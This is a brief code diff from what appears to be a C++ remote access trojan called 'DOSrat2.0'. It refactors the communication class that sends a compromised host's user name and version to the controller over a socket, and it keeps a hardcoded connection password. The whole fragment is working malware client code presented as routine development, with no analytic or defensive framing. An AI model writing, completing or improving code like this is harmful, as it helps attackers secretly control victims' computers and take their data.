@@ -16,7 +16,6 @@ class COMUNICAZIONI
 			GeneralUtils gu;
 
 			char Pass[10] = "DOSrat2.0";
-			string Buff;
 
 			TcpIP::SetTimeout(10000, Sock);
 
@@ -47,11 +46,9 @@ class COMUNICAZIONI
 			data["UserName"] = gu.GetCurrentUser();
 			data["Versione"] = Version;
 
-			Buff = data.dump();
+			TcpIP::SendString(Sock, data.dump());
 
-			send(Sock, to_string(Buff.size()).c_str(), 5, 0);
-			send(Sock, Buff.c_str(), Buff.size(), 0);
-			cout << Buff << endl;
+			cout << data.dump() << endl;
 			return true;
 		}
 };
